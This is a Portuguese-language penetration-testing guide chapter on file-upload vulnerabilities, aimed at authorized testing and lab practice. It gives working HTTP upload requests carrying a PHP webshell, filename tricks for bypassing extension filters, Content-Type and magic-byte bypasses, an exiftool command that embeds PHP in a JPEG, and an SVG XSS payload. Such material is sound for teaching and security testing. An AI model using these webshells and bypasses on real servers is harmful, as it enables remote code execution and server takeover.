# Fase 8: File Upload

**Tempo estimado:** 30-45 minutos
**Objetivo:** Testar se a aplicação aceita upload de arquivos perigosos (webshells, polyglots) que permitem execução remota de comandos.
**Por quê:** Um upload de webshell malicioso pode dar RCE (Remote Code Execution) completo no servidor. É uma das vulnerabilidades mais diretas para takeover.

---

## O que é File Upload Vulnerability?

Quando o servidor aceita upload de arquivos mas não valida corretamente:
- Aceita extensões perigosas (`.php`, `.jsp`, `.py`)
- Não valida conteúdo do arquivo
- Não renomeia arquivos de forma segura
- Armazena arquivos em diretório acessível via web

**Resultado:** Você pode subir um webshell e executar comandos no servidor.

---

## 8A.1 — Upload de Webshell

**O que você vai fazer:** Testar se a aplicação aceita upload de arquivos PHP ou outras extensões perigosas.

```http
POST /api/upload HTTP/1.1
Host: target.com
Content-Type: multipart/form-data; boundary=----boundary

------boundary
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: application/php

<?php echo system($_GET['cmd']); ?>
------boundary--
```

**Como testar:**
1. No Burp, intercepte o request de upload
2. Substitua o conteúdo do arquivo pelo webshell
3. Envie o request
4. Acesse `https://target.com/uploads/shell.php?cmd=whoami`

**✅ Output esperado (VULNERÁVEL):**
```
HTTP/1.1 200 OK
www-data
```

**O que procurar:** O output do comando `whoami` → **RCE confirmado.**

**✅ Output esperado (NÃO vulnerável):**
```
HTTP/1.1 403 Forbidden
{"error": "File type not allowed"}
```
ou
```
HTTP/1.1 200 OK
{"filename": "shell.php.jpg"}
```

Se o arquivo foi renomeado para `.php.jpg` → a extensão foi bloqueada mas o upload foi aceito.

**❌ Se der errado:**
| Problema | Causa | Alternativa |
|----------|-------|-------------|
| Upload rejeita PHP | Extensão bloqueada | Tente bypass (Passo 8A.2) |
| Upload aceita mas não executa | Diretório sem permissão de execução | Tente outro diretório ou extensão |
| Retorna 403 | WAF bloqueia conteúdo PHP | Tente bifício de Content-Type |

---

## 8A.2 — Bypass de Extensão

**O que você vai fazer:** Testar variações de extensão para burlar filtros.

| Payload | Como funciona |
|---------|---------------|
| `shell.php.jpg` | Filtro só verifica última extensão |
| `shell.php%00.jpg` | Null byte injection (PHP < 5.3.4) |
| `shell.pHp` | Case sensitivity |
| `shell.php5` | Extensão alternativa PHP |
| `shell.phtml` | Extensão PHP alternativa |
| `shell.php;.jpg` | IIS semicolon |
| `shell.php::$DATA` | Windows NTFS stream |
| `shell.php%0a` | Newline injection |

### Como testar no Burp:

```http
POST /api/upload HTTP/1.1
Host: target.com
Content-Type: multipart/form-data; boundary=----boundary

------boundary
Content-Disposition: form-data; name="file"; filename="shell.phtml"
Content-Type: text/plain

<?php echo system($_GET['cmd']); ?>
------boundary--
```

**❌ Se der errado:**
| Problema | Causa | Alternativa |
|----------|-------|-------------|
| Todas extensões bloqueadas | Whitelist de extensões | Tente polyglot (Passo 8A.5) |
| Upload aceita mas arquivo corrompido | Sanitização de conteúdo | Tente magic bytes bypass |

---

## 8A.3 — Bypass de Content-Type

**O que você vai fazer:** Alterar o Content-Type do request para parecer upload de imagem.

```http
POST /api/upload HTTP/1.1
Host: target.com
Content-Type: multipart/form-data; boundary=----boundary

------boundary
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg

<?php echo system($_GET['cmd']); ?>
------boundary--
```

**Por que funciona:** O servidor valida o Content-Type mas não o conteúdo real. Ao enviar `image/jpeg`, ele aceita o arquivo como imagem.

---

## 8A.4 — Bypass de Magic Bytes

**O que você vai fazer:** Adicionar bytes de identificação de arquivo (magic bytes) no início do webshell para enganar validação de tipo de arquivo.

```http
POST /api/upload HTTP/1.1
Host: target.com
Content-Type: multipart/form-data; boundary=----boundary

------boundary
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: application/php

GIF89a
<?php echo system($_GET['cmd']); ?>
------boundary--
```

**Por que funciona:** O servidor verifica os primeiros bytes do arquivo para identificar o tipo. `GIF89a` é o magic bytes de GIF. O PHP é executado porque a extensão continua `.php`.

### Magic bytes comuns:

| Arquivo | Magic Bytes |
|---------|-------------|
| GIF | `GIF89a` |
| PNG | `\x89PNG` |
| JPG | `\xFF\xD8\xFF` |
| PDF | `%PDF-1.4` |

---

## 8A.5 — Polyglot File

**O que você vai fazer:** Criar um arquivo que é VÁLIDO como imagem E como PHP.

```bash
# Instalar exiftool
sudo apt install libimage-exiftool-perl -y

# Criar polyglot
exiftool -Comment='<?php echo system($_GET["cmd"]); ?>' image.jpg

# Renomear (manter extensão .jpg mas com PHP embutido)
mv image.jpg shell.php.jpg
```

**Como funciona:**
1. `exiftool` coloca PHP dentro dos metadados EXIF da imagem
2. A imagem continua válida (pode ser aberta no navegador)
3. Quando acessada via PHP (se o servidor processar extensão), executa o código

**❌ Se der errado:**
| Problema | Causa | Alternativa |
|----------|-------|-------------|
| exiftool não instalado | Pacote faltando | `sudo apt install libimage-exiftool-perl -y` |
| Polyglot não executa | Servidor não processa .jpg como PHP | Tente outro vetor (SVG upload) |

---

## 8A.6 — Upload de SVG para XSS

```http
POST /api/upload HTTP/1.1
Host: target.com
Content-Type: multipart/form-data; boundary=----boundary

------boundary
Content-Disposition: form-data; name="file"; filename="xss.svg"
Content-Type: image/svg+xml

<?xml version="1.0" standalone="yes"?>
<svg width="500px" height="500px" xmlns="http://www.w3.org/2000/svg">
  <script>alert('XSS')</script>
</svg>
------boundary--
```

**Se o SVG for exibido inline (não como download) → XSS executado.**

---

## Checklist de File Upload

| # | Item | Arquivo gerado | ☑ |
|---|------|---------------|:---:|
| 1 | Upload de webshell testado | `relatorio/upload-test.txt` | [ ] |
| 2 | Bypass de extensão testado | `relatorio/upload-bypass.txt` | [ ] |
| 3 | Bypass de Content-Type testado | `relatorio/upload-content.txt` | [ ] |
| 4 | Bypass de magic bytes testado | `relatorio/upload-magic.txt` | [ ] |
| 5 | Polyglot file testado | `relatorio/upload-polyglot.txt` | [ ] |
| 6 | Upload de SVG para XSS | `relatorio/upload-svg-xss.txt` | [ ] |

### ✅ Sinal de sucesso:
- **Webshell uploaded e executado** (RCE confirmado)
- **Polyglot file** bypassou todas as validações
- **Upload de SVG** executou XSS

### ❌ Se falhou:
- Upload pode ter whitelist estrita → teste polyglot
- Servidor pode não executar PHP → tente outros vectores (JSP, Python)
- O mínimo para avançar: ter testado pelo menos 3 técnicas de bypass

### 🔗 O que deste arquivo alimenta nas próximas fases:
| Arquivo da Fase 8 | Usado na Fase | Para quê |
|--------------------|---------------|----------|
| `upload-test.txt` | Fase 11 (Validação) | Confirmar webshell funcional |
| `upload-bypass.txt` | Fase 12 (Relatório) | Documentar técnicas de bypass |

**Se completou tudo → Avance para Fase 9** (`09-business.md`)

---

## Mini-Checkpoint: Pratique Upload

1. Se você tem acesso a um lab DVWA: mude o nível para Low e teste upload de webshell PHP
2. Se não tiver lab: teste no PortSwigger "Web shell upload via path traversal": https://portswigger.net/web-security/file-upload/path-traversal/lab-web-shell-upload-via-path-traversal
3. Confirme que o webshell é executado via navegador

Se conseguiu → avance. Se não → revise os bypass de extensão na seção 8A.2.
